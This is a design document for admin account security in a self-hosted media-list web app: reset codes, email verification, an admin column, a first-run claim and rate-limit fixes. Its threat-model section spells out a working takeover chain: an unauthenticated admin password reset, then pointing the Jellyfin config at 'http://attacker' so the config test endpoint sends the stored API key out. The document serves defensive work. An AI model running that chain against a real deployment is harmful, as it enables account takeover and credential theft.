# Admin account security - design

Status: proposed, not implemented. Written 2026-08-16.

## The problem

`POST /api/auth/reset-password` takes `{ username, newPassword }`, checks
nothing, and resets any account. That was a deliberate tradeoff for a LAN app
with no email infrastructure, and the comment above it says so.

Two things changed. The site is served publicly at `https://saltychart.net`
through Nginx Proxy Manager, and there are now admin pages behind that door.
The chain is short and needs no exotic technique:

1. `POST /api/auth/reset-password` with the admin's username. No auth needed.
2. Log in as the admin.
3. `PUT /api/jellyfin/config` with `{ url: "http://attacker", apiKey: "" }`.
   An empty key deliberately keeps the stored one (`jellyfin.ts:650`).
4. `POST /api/jellyfin/config/test`, which reads the *stored* key
   (`jellyfin.ts:687`) and sends it to the URL just supplied.

The Jellyfin API key leaves the building. The "key never reaches a browser"
guard in the stream proxy is intact and irrelevant - this walks out a different
door, exactly as the secrets rule in `CLAUDE.md` warns. The same access also
reaches Sonarr pushes, identity overrides and the translate cache.

Normal accounts are explicitly out of scope for hardening. The owner's position
is that list data does not matter and signup must stay frictionless.

## Decisions

Each was chosen deliberately; the rejected alternative is recorded because the
reasoning is the part that rots.

**A verified email on the account is what triggers protection, not the admin
flag.** The reset endpoint branches on `emailVerifiedAt != null`, never on a
role. Consequences: any user can opt in by adding an email, the reset page
discloses "this account has an email" rather than "this account is an admin",
and a promotion cannot leave someone on the open path, because promotion
requires a verified email first. Rejected: keying on `isAdmin`, which makes the
reset page an admin directory and puts the guarantee in a human's memory.

**Admins are symmetric peers, with a floor of one.** Any admin may promote,
demote or delete any other, except that demote and delete refuse when they
would leave zero admins. Rejected: a permanent root account tied to
`ADMIN_USER_ID`. The floor prevents lockout without a special case, which is
the only thing the root account bought.

**An admin may not reset another admin's password from the users page.** Admin
accounts recover only through their own email. Otherwise promoting a friend
hands them a one-click takeover of the account this design exists to protect.
An admin who genuinely loses their inbox is recovered by demoting them first,
which is two clicks and leaves the change visible.

**An admin account is never resettable through the open endpoint, even with no
email set.** Without this the first deploy changes nothing until someone
remembers to configure an address. The admin pages nag about the unconfigured
state so it is never silent.

**Codes, not links.** A 6-digit code typed into the page the user is already
looking at. No base URL to configure, no credential in a URL or a referrer, and
it behaves identically on the LAN and off it. Rejected: an emailed link, which
is nicer to click and costs a configured public origin plus a token in a URL.

**Generic SMTP, starting with Gmail.** Host, port, user, pass and from-address
as env vars. Gmail with an App Password is free and needs no domain. Namecheap
Private Email would send from `noreply@saltychart.net` and costs about $1/month;
Namecheap's free offering is inbound forwarding only and cannot send at all.
Moving between them is four env vars and a restart, so the choice is not
encoded anywhere in the code.

**First run is claimed with a code printed to the server log.** On an empty
database today, whoever signs up first gets id 1 and becomes admin by the
`ADMIN_USER_ID` default - a land-grab on a public domain, reachable if the DB
is ever restored empty. When zero admins exist the backend prints a one-time
code at startup and `/admin` shows a claim form. Reading `docker logs` proves
ownership of the box, and the same path is break-glass recovery if every admin
account is ever lost.

## Schema

Additive only: nullable or defaulted columns and one new table. No foreign key
is altered, because SQLite cannot alter one in place and rebuilding a live
table is not worth it here - user deletion clears children explicitly instead.

Both `backend/prisma/schema.prisma` and the raw SQL in `ensureDatabaseSchema()`
(`backend/src/index.ts`) must carry all of it. Production never runs
`prisma migrate`; the raw SQL is authoritative at runtime.

On `User`:

| column | type | default | meaning |
|---|---|---|---|
| `email` | TEXT | NULL | recovery address; not unique, since a household may share one |
| `emailVerifiedAt` | DATETIME | NULL | non-null is the whole protection rule |
| `isAdmin` | BOOLEAN | 0 | replaces the `ADMIN_USER_ID` comparison |
| `tokenVersion` | INTEGER | 0 | bumped on password change to kill live JWTs |

New `AuthCode`:

| column | notes |
|---|---|
| `id` | PK |
| `userId` | indexed; no FK cascade, deleted explicitly with the user |
| `purpose` | `reset` or `verifyEmail` |
| `codeHash` | bcrypt, not a fast hash - see *Code rules* |
| `expiresAt` | issue time + 10 minutes |
| `attempts` | incremented per wrong guess, capped at 5 |
| `consumedAt` | non-null once used or killed |
| `createdAt` | for the per-hour issue cap |

**Bootstrap.** On startup, if no row has `isAdmin = 1` *and* a user exists with
`id = ADMIN_USER_ID`, set that row's `isAdmin = 1`. Runs once and never fights
the column afterwards. `ADMIN_USER_ID` survives only as this bootstrap and as
the id the five Python tools sign tokens for.

## Auth model

`requireAuth` already loads the full user row to confirm existence. It will
hang that row on `req.user`, so `requireAdmin` reads `req.user.isAdmin` with no
second query.

`requireAuth` additionally rejects when the token's `v` claim does not match
`user.tokenVersion`. **A missing claim reads as 0**, which is the column
default, so the hand-minted `{ id }` tokens in `test_ui_interactions.py`,
`test_jellyfin.py`, `test_sonarr.py`, `sonarr_dryrun.py` and
`sonarr_tag_backlog.py` keep working untouched.

`routes/translate.ts` parses its own copy of the admin check inline at lines
599, 657 and 714. Those fold into the shared middleware. The middleware's own
comment already flags them, and a security constant with four copies can
disagree with itself.

`GET /api/jellyfin/status` reports `isAdmin` from the column.

## Reset flow

```
                 POST /reset-request { username }
                              │
        ┌─────────────────────┼─────────────────────┐
   open account         protected account      admin, no email
   (no verified          (verified email)      configured yet
    email, not
    an admin)
        │                     │                     │
 { codeRequired:      send code,            { codeRequired: true,
   false }            { codeRequired: true,   noAddress: true }
        │               hint: "g...l@gmail.com" }   │
        │                     │              page says: ask another
        │                     │              admin to demote you
 POST /reset-password  POST /reset-verify           │
 { username,           { username, code,          (dead end,
   newPassword }         newPassword }             by design)
        │                     │
   reset, bump           reset, bump
   tokenVersion          tokenVersion
```

Neither success path returns a JWT. Both land on the existing "Password updated
successfully / Log in here" screen, matching what `ResetPassword.svelte` does
today. Auto-login would add a fourth way to mint a token for no real gain.

`POST /reset-password` gains three refusals before its existing behaviour:

- target `isAdmin` -> **403 `ADMIN_RESET_BLOCKED`**, regardless of email. The
  message names the email flow, or tells them to ask another admin when the
  admin has no address configured.
- target `emailVerifiedAt != null` -> **409 `CODE_REQUIRED`**.
- otherwise unchanged, plus a `tokenVersion` bump.

An admin with no verified email has no self-service reset at all. That is
intended: they know their password, they are logged in, and the Account section
is one click away. Another admin can demote them if it ever goes wrong.

### Code rules

These are the guarantees, not implementation notes. Each gets a mutation row.

- Six digits from `crypto.randomInt`, never `Math.random`.
- **Hashed with bcrypt**, like a password. A 6-digit space is only one million
  values, so a fast hash would make a leaked database equivalent to a leaked
  code. One bcrypt comparison per verification is free at this volume.
- Ten-minute expiry, checked against `expiresAt`, never against `createdAt`
  plus a constant computed elsewhere.
- Single use: `consumedAt` is set on success.
- Five wrong attempts kill the code. Guessing therefore costs a fresh request
  per five guesses, not a fresh guess.
- Issuing a code marks any earlier unconsumed code for the same user and
  purpose as consumed, so attempts cannot be farmed across parallel codes.
- At most three codes issued per account per hour.

### What this deliberately does not fix

The reset flow reveals whether a username exists (a 404 today) and now also
whether it is protected. Fixing enumeration would mean the page lying to a user
who typed their own name correctly. On a friend-group app that trade is not
worth it, and the existing endpoint already leaks the first half.

## Email, set and verified

An unverified address must never count as protection. A typo would otherwise
make an account permanently unresettable, which is a worse failure than the one
being fixed.

- `POST /api/auth/email { email, currentPassword }` writes `email` and sends a
  `verifyEmail` code to the **new** address. `emailVerifiedAt` stays null, so
  protection does not engage yet.
- `POST /api/auth/email/verify { code }` sets `emailVerifiedAt`.
- `DELETE /api/auth/email { currentPassword }` clears both. Refused with
  **409 `EMAIL_REQUIRED_FOR_ADMIN`** when the caller is an admin.

The current password is required to set or clear an address. Without it, a
borrowed unlocked laptop silently redirects the recovery channel, which is
worth more to an attacker than the session itself.

## Endpoints

All new admin routes carry `requireAuth` + `requireAdmin`. They inherit
`generalLimiter`; the auth routes sit behind the existing 20/min `authLimiter`.

`/api/auth`:

| route | auth | purpose |
|---|---|---|
| `POST /reset-request` | none | does this account need a code, and send it if so |
| `POST /reset-verify` | none | code + new password -> reset, no token issued |
| `POST /reset-password` | none | unchanged for open accounts, refuses otherwise |
| `POST /change-password` | JWT | current + new password |
| `GET /account` | JWT | `{ username, email, emailVerified, isAdmin }` |
| `POST /email` | JWT | set address, send verification code |
| `POST /email/verify` | JWT | consume the code, mark verified |
| `DELETE /email` | JWT | clear, refused for admins |
| `POST /claim-admin` | JWT | first run only, setup code from the log |

`/api/admin/users` (new router, `routes/adminUsers.ts`):

| route | purpose |
|---|---|
| `GET /` | id, username, email, emailVerified, isAdmin, createdAt, list count |
| `PATCH /:id` | `{ isAdmin }`; promote needs a verified email on the target, demote respects the floor |
| `POST /:id/password` | reset a non-admin's password; refuses admin targets; bumps their `tokenVersion` |
| `DELETE /:id` | refuses the last admin and refuses self; clears lists, settings and codes in one transaction |
| `POST /test-email` | send a test message, mirroring the Jellyfin and Sonarr `config/test` pattern |

New error codes: `ADMIN_RESET_BLOCKED`, `CODE_REQUIRED`, `INVALID_CODE`,
`CODE_EXPIRED`, `TOO_MANY_ATTEMPTS`, `EMAIL_NOT_VERIFIED`,
`EMAIL_REQUIRED_FOR_ADMIN`, `LAST_ADMIN`, `SMTP_NOT_CONFIGURED`,
`SETUP_CODE_INVALID`, `ALREADY_INITIALIZED`. Every response keeps the
established `{ error, code }` shape.

**The last-admin floor counts, it does not cache.** Demote and delete run
`count({ where: { isAdmin: true } })` inside the same transaction as the write.

## Frontend

- **`/admin/users`**, a fourth entry in the `TABS` array in
  `AdminTabs.svelte`, the `current` union in both that file and
  `AdminShell.svelte`, and a case in `App.svelte`'s router. It renders inside
  the existing shell, so it inherits the gate and the frame for free.
  Rows carry `createdAt` and a warning chip on any admin without a verified
  email, because signup is open to the internet and both facts are worth
  seeing at a glance.
- **The nag.** `AdminShell` fetches `GET /api/auth/account` and shows a
  warning when the viewer is an admin with no verified email, linking to the
  Account section. Other admins' unconfigured state shows on the users page
  rather than through a second endpoint.
- **Account section in `OptionsModal.svelte`**: email with its verification
  step, and change-password. The email field has to live somewhere, and once
  it does, change-password is nearly free.
- **`ResetPassword.svelte`** gains a code step between username and new
  password, entered only when `/reset-request` says `codeRequired`.
- **First-run claim** renders in place of the tabs when the backend reports no
  admin exists.

All new copy is ASCII, per the global convention. UI glyphs use HTML entities.

## First-run setup

At startup, when `count(isAdmin = 1) === 0`, generate a code with
`crypto.randomBytes` and log it under a `[SETUP]` prefix. **Held in memory
only** and regenerated every boot, so it cannot leak from a database backup and
a restart invalidates it.

`POST /api/auth/claim-admin { code }` requires a valid JWT, refuses with
**409 `ALREADY_INITIALIZED`** once any admin exists, and otherwise sets
`isAdmin` on the caller and directs them to set an email. No code is printed
once an admin exists.

## Rate limiting must be fixed first

`app.set('trust proxy', 'loopback')` (`index.ts:92`) claims to trust "our
internal Nginx", but nginx is a **separate container** on the `salty-net`
bridge, so the backend's peer is `172.x.x.x` and never loopback. Express
therefore ignores the `X-Forwarded-For` header that `frontend/nginx.conf:34`
sets, and `req.ip` is the nginx container's address for every request from
every visitor.

If that holds, `generalLimiter` (120/min), `authLimiter` (20/min) and
`publicListLimiter` (60/min) are single global buckets: any stranger can lock
everyone out of login with 20 requests a minute, and a per-IP guard on reset
codes would in practice be a global one that any visitor could exhaust to block
a real reset.

The chain is `internet -> NPM -> frontend nginx -> backend`, so the value is
`app.set('trust proxy', 2)`: trust two hops and take the leftmost XFF entry.
Safe specifically because the backend uses `expose` rather than `ports`, so
nothing outside the Docker network can reach :3000 to forge a header.

**Confirm by measurement before and after** - log `req.ip` on one request from
an off-LAN device. This is inferred from configuration, not measured, and the
repo's own rule is that a diagnostic which does not send what the real caller
sends measures a program nobody ships.

## SMTP configuration

`SMTP_HOST`, `SMTP_PORT`, `SMTP_USER`, `SMTP_PASS`, `SMTP_FROM`, threaded
through the untracked `.env` **and** the `environment:` block of both compose
files, exactly as `JWT_SECRET` is. Missing the compose half is the likely
mistake: the container simply never sees them.

Unset SMTP **does not** fail startup the way `JWT_SECRET` does. That would
break local dev and any deploy made before the values are set. It fails at the
point of use with `SMTP_NOT_CONFIGURED`, and the admin page says so plainly.

**Never log a nodemailer error object.** It carries the transport config
including `auth.pass`. `backend/CLAUDE.md` records the same class of bug in
axios, where `console.warn('...', err)` printed the Jellyfin `Token="..."` into
the backend log. A `mailErrorInfo(err)` helper mirrors `jellyfinErrorInfo`.

## Testing

Per the global convention: no mocks for storage, and every new test gets a
mutation row that is watched to fail and pass.

**Unit, off the network** (`backend/src/lib/`):

- `authCodes.test.ts` - generation is uniform and uses `crypto`, hash and
  verify round-trip, expiry boundary, the attempt cap, and that issuing
  invalidates a prior unconsumed code.
- A pure predicate for "may this account be reset through the open endpoint",
  so the three-way branch is tested without an HTTP round trip.

**Integration** (`tools/tests/test_api_negative.py`): open reset still works
for a plain account; refused with `ADMIN_RESET_BLOCKED` for an admin; refused
with `CODE_REQUIRED` once an email is verified; admin routes 403 for a
non-admin; demoting the last admin refused; promoting without a verified email
refused; resetting an admin's password from the users page refused.

**Mailer**: injected, so tests capture instead of sending. A mocked mailer
passing proves nothing about the App Password, so one real send is verified by
hand and that fact is recorded rather than implied.

**Mutation rows** - the guards that fail silently if broken:

1. `requireAdmin` reading the column
2. the last-admin floor
3. promotion requiring a verified email
4. code expiry
5. the attempt cap
6. `ADMIN_RESET_BLOCKED`
7. the `tokenVersion` check
8. the first-run setup code being required

`test_audit_anchors.py` pins source snippets, so any anchor text it holds for
these files moves with the code.

## Order of work

Each phase leaves the tree deployable.

1. Schema, the `isAdmin` column and bootstrap, `requireAdmin` from the column,
   the `translate.ts` fold, `trust proxy`. No user-visible change beyond where
   admin-ness is read from.
2. `authCodes.ts`, `mailer.ts`, the reset refusals and the code flow, the
   Account section. **The takeover hole closes here.**
3. The admin users page and its router.
4. First-run claim.
5. Docs and the mutation rows.

`run_all.py` runs once immediately before the push, per the deploy gate.

## Documentation to update

**The root guide has almost no room left, and this constrains the split.**
Measured 2026-08-16: `CLAUDE.md` is 39,772 characters against
`ROOT_BUDGET_WARN = 40_000` and `ROOT_BUDGET_FAIL = 45_000` in
`test_audit_anchors.py`. It is 228 characters from a warning. So the root gets
only what binds from outside `backend/`: that admin is a column rather than an
env var, that the open reset is no longer unconditional, one-line router
entries, and the never-log-the-mailer-error prohibition. Everything else -
route contracts, code rules, schema - goes in the nested guides. Some of the
existing `reset-password` paragraph is replaced rather than added to, which
helps.

- Root `CLAUDE.md` - the auth model, one-line entries for the new routes, and
  the `reset-password` description, which currently documents the open
  behaviour as intentional and would otherwise become a lie.
- `backend/CLAUDE.md` - the full `/api/auth` and `/api/admin/users` contracts,
  the code rules, the new error codes, and the SMTP env vars.
- `backend/CLAUDE.md` - the schema table and the never-log-the-error rule
  extended to the mailer.
- `frontend/CLAUDE.md` - the fourth admin tab, the Account section, the reset
  page's code step.
- `README.md` - feature highlights and the deployer-facing env vars.
- `backend/.env.example` - the SMTP keys.

## Out of scope

TOTP or any second factor; notifying an address when it is changed; password
strength rules; lockout after failed *logins* (distinct from failed codes);
listing or revoking individual sessions; and hardening normal accounts, which
the owner has explicitly declined.

## Known risks

- **The test tooling assumes `ADMIN_USER_ID` stays an admin.** Five scripts
  sign tokens for that id. Demoting it through the UI would break them. The
  last-admin floor makes it unlikely rather than impossible.
- **Deploy leaves a window.** Between phase 1 and phase 2 the hole is still
  open. Phases 1 and 2 should ship together unless there is a reason not to.
- **An App Password is a live credential in `.env`.** It is worth less than the
  Jellyfin key but it is a Google account credential, which argues for a
  throwaway sending account rather than a personal one.
- **`trust proxy: 2` is only correct while the proxy chain is two hops.**
  Putting Cloudflare in front, or removing the frontend nginx, changes it. A
  comment at the setting should say so.
